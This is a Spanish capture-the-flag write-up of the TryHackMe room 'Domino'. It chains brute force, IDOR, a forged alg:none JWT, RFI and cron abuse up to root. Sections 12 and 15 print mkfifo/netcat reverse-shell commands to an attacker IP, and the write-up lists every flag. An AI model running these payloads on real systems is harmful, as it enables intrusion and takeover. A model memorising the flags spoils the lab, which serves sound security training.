# TryHackMe — Domino (NexusCorp Portal)

**Sala:** Domino  
**Plataforma:** TryHackMe  
**Tema:** Pentest de aplicación web · Enumeración de usuarios · Fuerza bruta · IDOR (escalada horizontal) · JWT / sesión admin · LFI · SSRF · Reverse shell · Movimiento lateral · Escalada de privilegios  
**Objetivo:** Capturar los **5 flags** de la sala, accesibles desde la web del portal de empleados de *NexusCorp* hasta una shell de root.  
**Dificultad:** Intermedio

> **Nota importante:** Esta sala **no** es de Active Directory. Es una máquina Linux con un servidor web Apache (portal "NexusCorp") y SSH. Los "usuarios" son cuentas de la aplicación web, no usuarios de dominio Windows.

---

## 0. Información de la máquina

- **Servicios:** SSH (OpenSSH) y HTTP (Apache 2.4.58) — el portal web se titula **NexusCorp Portal**.
- **Dirección IP:** varía según el despliegue de la sala (en las capturas aparecen `10.66.171.93`, `10.64.168.130` y `10.64.146.147`). Usa tu IP actual.
- **URL de la app:** `http://IP_MACHINE/index.php`

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC -T4 -oN nmap_initial IP_MACHINE
```

Se identifican los puertos abiertos: **22/tcp (SSH)** y **80/tcp (HTTP)** con el título **NexusCorp Portal**.

![[Pasted image 20261105012047.png]]

*Figura: Escaneo inicial. Servicios: OpenSSH 9.6p1 (Ubuntu) y Apache 2.4.58 con título "NexusCorp Portal".*

---

## 2. Enumeración web

### 2.1 Página de login

Al visitar `http://IP_MACHINE/index.php` se muestra un portal de empleados con campos **Username** (formato `firstname.lastname`) y **Password**.

![[Pasted image 20261105223736.png]]

### 2.2 Página de equipo (`team.php`)

Existe una página `team.php` con la plantilla del equipo de NexusCorp. Contiene nombres, cargos y correos de los empleados.

![[Pasted image 20261105223717.png]]

*Figura: Lista de empleados (Laura Hayes CIO, Michael Chen, Sarah Johnson, Robert Wilson, Emma Taylor, David Brown, James Wright).*

### 2.3 Enumeración de usuarios (usernames)

Se extraen los nombres de usuario de los correos del `team.php` para usarlos en la fuerza bruta:

```bash
curl -s http://IP_MACHINE/team.php | grep -oP 'mailto:\K[^"]+'
```

Salida: `laura.hayes`, `michael.chen`, `sarah.johnson`, `robert.wilson`, `emma.taylor`, `david.brown`, `james.wright`

![[Pasted image 20261105223656.png]]



![[Pasted image 20261105223543.png]]
### 2.4 Fuerza bruta de directorios (Gobuster)

```bash
gobuster dir -u http://IP_MACHINE -w /usr/share/wordlists/Discovery/Web-Content/common.txt
```

Directorios encontrados (301/200/403): `/admin`, `/api`, `/backup`, `/index.php`, `/javascript`, `/server-status`, `/static`, `/support`. 

*Figura: Gobuster revela directorios interesantes, especialmente `/admin`, `/api` y `/backup`.*

---

## 3. Revisión del código fuente (JavaScript)

En `/static/app.js` hay configuración sensible expuesta:

- `apiBase: '/api'`
- **`backupKey: 'N3xusK3y2024!!'`** (clave AES para descifrar el backup, se rellena a 16 bytes con `\0`)
- `appVersion: '2.3.1'`
- Manejo de sesión con cookie `nexus_session` (JSON en base64) y JWT en `localStorage` (`nexus_jwt`).
- Endpoint de token: `/api/auth/token.php`

![[Pasted image 20261105230033.png]]

*Figura: `static/app.js` con la clave de backup y los endpoints de la API.*

También se revisa el HTML de `team.php` con `curl` para confirmar la estructura.

![[Pasted image 20261105233013.png]]

---

## 4. Backup cifrado y descifrado AES

El directorio `/backup` contiene un archivo cifrado `config.enc`. Se descifra con **AES-ECB** usando la clave `N3xusK3y2024!!` encontrada en el JavaScript:

```python
# descifrar.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY = b'N3xusK3y2024!!' + b'\x00' * 2   # 14 chars + 2 null bytes = 16 bytes

with open('config.enc', 'rb') as f:
    data = f.read()

cipher = AES.new(KEY, AES.MODE_ECB)
plain = cipher.decrypt(data)

try:
    plain = unpad(plain, AES.block_size)
except ValueError:
    plain = plain.rstrip(b'\x00')

print(plain.decode('utf-8', errors='ignore'))
```

![[Pasted image 20261105230231.png]]

*Figura: Script `descifrar.py` para descifrar `config.enc` con AES-ECB.*

**Resultado** del descifrado:

```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

![[Pasted image 20261105233045.png]]

*Figura: Contenido descifrado de `config.enc`.*

---

## 5. Fuerza bruta de contraseñas (Hydra)

Con los usuarios extraídos y la contraseña débil `password`, se lanza Hydra contra el formulario de login:

```bash
hydra -L usuario.txt -P /usr/share/wordlists/rockyou.txt IP_MACHINE http-post-form \
  '/index.php:username=^USER^&password=^PASS^:Invalid credentials' -I
```

**Credenciales obtenidas** (ejemplos de la captura):

| Usuario | Contraseña |
|---------|------------|
| laura.hayes | password |
| michael.chen | password |
| sarah.johnson | password |
| robert.wilson | password |
| emma.taylor | password |
| david.brown | password |

![[Pasted image 20261106010938.png]]

*Figura: Hydra crakea múltiples cuentas con contraseñas débiles.*

---

## 6. Acceso inicial (login como usuario normal)

Se inicia sesión con un usuario de bajo privilegio (ej. `sarah.johnson`). El dashboard muestra:

- **My Profile** → `username: sarah.johnson`, `email: sarah.johnson@nexus.corp`, `role: user`
- **File Viewer** → acceso a documentos internos vía `/api/files.php?name=` (requiere JWT de `/api/auth/token.php`)
- **Quick Links** → Support Tickets, Open Ticket, **My Profile API**

![[Pasted image 20261106004836.png]]

![[Pasted image 20261106004955.png]]

*Figura: Dashboard autenticado como `sarah.johnson` (rol `user`). Se exponen los endpoints de la API.*

---

## 7. Escalada horizontal (IDOR) → Flag 1

El endpoint **My Profile API** es vulnerable a **IDOR** (Insecure Direct Object Reference). Al cambiar el parámetro `id` se accede al perfil de otros usuarios, incluido el administrador (`laura.hayes`, `role: admin`):

```
GET /api/users/profile.php?id=1
```

Respuesta JSON con el **flag 1**:

```json
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"
}
```

![[Pasted image 20261106004806.png]]

*Figura: IDOR en `/api/users/profile.php?id=1` → flag `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}` (acceso horizontal). Grafía exacta: `1d0r_h0r1z0nt4l` (con **número 1**), confirmada en la sala.*

> ⚠️ **Nota sobre la imagen:** la captura `20261106004806` que había aquí mostraba la salida de **Hydra**, no la respuesta del IDOR. Falta reemplazarla por la captura real de `GET /api/users/profile.php?id=1` con el flag.

---

## 8. Acceso al panel de administración (JWT) → Flag 2

Usando un **token JWT (Bearer) forjado con `role: admin`** (el servidor no valida la firma), se accede al panel de administración `/admin/`:

```bash
curl -i -H 'Authorization: Bearer <JWT_TOKEN>' http://IP_MACHINE/admin/
```

Respuesta `HTTP 1.1 200 OK` con el **Admin Panel** que contiene el **flag 2**:

```html
<h1>Administration Console</h1>
<p>Logged in as: <strong>...</strong></p>
<div class="flag-box">
  <h3>System Status</h3>
  <p>Internal reference: <code>THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</code></p>
</div>
```

![[Pasted image 20261106010908.png]]

*Figura: Panel `/admin/` con el flag `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` (hijack de sesión / acceso admin).*

> El nombre del flag (`bl1nd_x55_s3ss10n_h1j4ck`) indica que la ruta prevista incluía un **XSS ciego** para secuestrar la sesión de un admin, aunque en este caso se alcanzó el panel admin mediante el token Bearer.

---

## 9. File Viewer (LFI) → filtrado de `config.php`

Con el JWT de un usuario autenticado, el **File Viewer** (`/api/files.php?name=`) permite leer ficheros de la **webroot** del servidor (p. ej. `config.php`). Nota: la lectura es limitada — rutas fuera de la webroot como `/etc/passwd` **no** funcionan (probado en la sala). Consultando la configuración de la aplicación se obtiene su contenido en formato JSON:

```json
{"file": "/var/www/html/config.php", "content": "<?php ... ?>"}
```

```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

Datos obtenidos:

- **Credenciales de la BD** `nexusdb`: `app_user` / `D3v0ps!2024` — la contraseña se **reutiliza** más adelante (sección 14).
- **`JWT_SECRET`** y **`APP_SECRET`**: secrets para firmar/manipular tokens de la aplicación.

![[Pasted image 20261107003634.png]]

*Figura: `files.php?name=/var/www/html/config.php` devuelve el contenido completo del archivo de configuración.*

![[Pasted image 20261107213220.png]]

*Figura: Secrets extraídos de `config.php`: credenciales de BD, `JWT_SECRET` y `APP_SECRET`.*

---

## 10. Ticket de soporte y `webserver.py` → captura de sesión

El portal incluye un formulario de **support ticket** (`Open Ticket`). Al enviar un ticket, el personal/admin lo consulta, y esa petición puede ser capturada con un servidor logger sencillo (`webserver.py`), que imprime método, path, cabeceras y body, y siempre responde `200 OK`:

```python
 File: webserver.py
─────┼─────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ from http.server import BaseHTTPRequestHandler, HTTPServer
   2 │ 
   3 │ class Handler(BaseHTTPRequestHandler):
   4 │     def _log(self):
   5 │         print(f"\n--- {self.command} {self.path} ---")
   6 │         print("Headers:")
   7 │         for key, value in self.headers.items():
   8 │             print(f"  {key}: {value}")
   9 │ 
  10 │         length = int(self.headers.get("Content-Length", 0))
  11 │         if length:
  12 │             body = self.rfile.read(length)
  13 │             print(f"Body ({length} bytes):")
  14 │             print(body.decode("utf-8", errors="replace"))
  15 │ 
  16 │         self.send_response(200)
  17 │         self.send_header("Content-Type", "text/plain")
  18 │         self.end_headers()
  19 │         self.wfile.write(b"OK\n")
  20 │ 
  21 │     do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = _log
  22 │ 
  23 │ if __name__ == "__main__":
  24 │     port = 80
  25 │     print(f"Listening on http://localhost:{port}")
  26 │     HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

![[Pasted image 20261107212631.png]]

*Figura: Formulario de ticket de soporte usado para disparar la petición del administrador.*

![[Pasted image 20261108012454.png]]

*Figura: `webserver.py` capturando la petición entrante con todas sus cabeceras.*

![[Pasted image 20261107213022.png]]

*Figura: Cabecera `Cookie: nexus_session=...` capturada — pertenece a la sesión del administrador.*

---

## 11. Forja de JWT (`alg:none`) → sesión admin → Flag 2

El servidor acepta tokens **sin firmar** (`alg: none`). Con el *JWT Encoder* se construye un token con cabecera `{"alg":"none","typ":"JWT"}` y payload:

```json
{"sub": "laura.hayes", "role": "admin", "iat": 1794115375, "exp": 1794118975}
```

Token forjado (sin firma):

```
Bearer  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDExNTM3NSwiZXhwIjoxNzk0MTE4OTc1fQ.
```

![[Pasted image 20261108012000.png]]

*Figura: JWT Encoder con `alg: none`, `sub: laura.hayes` y `role: admin`.*

![[Pasted image 20261108012130.png]]

*Figura: Token forjado listo para usar en la cabecera `Authorization: Bearer`.*

![[Pasted image 20261108012155.png]]

*Figura: Acceso a `/admin/` con el token forjado (`HTTP 1.1 200 OK`) → flag `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` (detalle de la sección 8).*

---

## 12. RFI (Remote File Inclusion) en `files.php` → reverse shell (Penelope)

`files.php` no solo lee rutas locales: también acepta **URLs remotas** y las **incluye/ejecuta (RFI — Remote File Inclusion)**. Por eso el flag 3 se llama `rf1_2_rc3` (RFI → RCE). Comprobaciones:

- `name=test` → responde `JWT token required`.
- `name=http://192.168.131.171/shell.php` → `HTTP 1.1 200 OK` (el servidor descarga y **ejecuta** el script del atacante).

Preparativos en el atacante:

```bash
python -m http.server 80        # sirve shell.php
```

Payload de reverse shell (inyectado vía el **RFI**):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.131.171 4444 >/tmp/f
```

> ⚠️ El puerto del **payload** y el del **listener** deben coincidir. En la sala se usó el **4444** en ambos (la captura del payload muestra `9000`, pero el listener que recibió la conexión fue el de `4444`; usa el mismo puerto en los dos).

Listener:

```bash
nc -lvnp 4444
# o penelope.py, escuchando en :4444
```



*Figura: Control en `files.php` con `name=test` → error `JWT token required`.*

![[Pasted image 20261108020943.png]]

*Figura: SSRF — `files.php?name=http://192.168.131.171/shell.php` responde `200 OK`.*

![[Pasted image 20261108021034.png]]

*Figura: `python -m http.server 80` sirviendo `shell.php` desde la máquina atacante.*

![[Pasted image 20261108021151.png]]

*Figura: Payload de reverse shell (mkfifo + `nc` al puerto 9000).*

![[Pasted image 20261108021423.png]]

*Figura: `penelope.py` a la escucha en el puerto `:4444`.*

![[Pasted image 20261108021518.png]]

*Figura: Shell establecida como `www-data` (UID 33) en `tryhackme-2404` (10.67.186.131).*

---

## 13. Flag 3 en `/opt`

Desde la shell de `www-data` se recorre el sistema y en `/opt` aparece el siguiente flag:

```bash
ls /opt
cat /opt/flag3.txt
# THM{rf1_2_rc3_f00th0ld_fl4g3}
```

![[Pasted image 20261108021829.png]]

*Figura: `ls /opt` — se localiza `flag3.txt`.*

![[Pasted image 20261108021943.png]]

*Figura: `cat flag3.txt` → `THM{rf1_2_rc3_f00th0ld_fl4g3}` (foothold).*

---

## 14. Movimiento lateral → usuario `devops` → Flag 4

La contraseña encontrada en `config.php` (`D3v0ps!2024`) se reutiliza para escalar del shell de `www-data` al usuario **`devops`**:

```bash
su devops
# contraseña: D3v0ps!2024
cat user.txt
# THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

![[Pasted image 20261108022031.png]]

*Figura: `su devops` con la credencial reutilizada de `config.php`.*

![[Pasted image 20261108022123.png]]

*Figura: `cat user.txt` → `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}` (reutilización de credenciales / movimiento lateral).*

---

## 15. Escalada de privilegios (cron) → Flag 5

Para ver procesos y cron jobs en segundo plano se sube **pspy64** (3.104.768 bytes) y se ejecuta:

```bash
wget http://192.168.131.171/pspy64
chmod +x pspy64
./pspy64
```

pspy revela un cron job que ejecuta **`/opt/monitoring/health_report.sh`** periódicamente como root. Dicho script es **writable por el grupo `devops`** (`-rwxrwxr-- root devops`), así que basta con sobrescribirlo con un payload (o añadir `chmod +s /usr/bin/bash` y luego `bash -p`) para obtener shell de root:

```bash
# payload en /opt/monitoring/health_report.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.131.171 9000 >/tmp/f
```

```bash
whoami   # root
cat /root/root.txt
# THM{pr1v3sc_cr0n_r00t_fl4g5}
```

![[Pasted image 20261108022351.png]]

*Figura: Descarga y ejecución de `pspy64` (3.144.064 bytes).*

![[Pasted image 20261108022340.png]]

*Figura: `pspy64` muestra el cron job `health_report.sh` ejecutándose como root.*

![[Pasted image 20261108022424.png]]

*Figura: Inyección del payload en el script del cron para obtener la shell de root.*

![[Captura de pantalla 2026-11-08 022444.png]]

*Figura: Shell de root → flag `THM{pr1v3sc_cr0n_r00t_fl4g5}`.*

---

## 16. Resumen de los 5 flags

| # | Flag | Vía |
|---|------|-----|
| 1 | `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}` | IDOR en `/api/users/profile.php?id=` (escalada horizontal) |
| 2 | `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}` | Forja de JWT `alg:none` → panel `/admin/` |
| 3 | `THM{rf1_2_rc3_f00th0ld_fl4g3}` | RFI en `files.php` → reverse shell → `/opt/flag3.txt` |
| 4 | `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}` | Reutilización de credencial `D3v0ps!2024` → `su devops` → `user.txt` |
| 5 | `THM{pr1v3sc_cr0n_r00t_fl4g5}` | pspy64 → cron `/opt/monitoring/health_report.sh` → root → `/root/root.txt` |

**Cadena completa:** enum web → fuerza bruta → IDOR (flag 1) → lectura de `config.php` → captura de cookie + JWT `alg:none` (flag 2) → RFI → reverse shell (flag 3) → movimiento lateral a `devops` (flag 4) → privesc por cron a root (flag 5).
![[Pasted image 20261108012921.png]]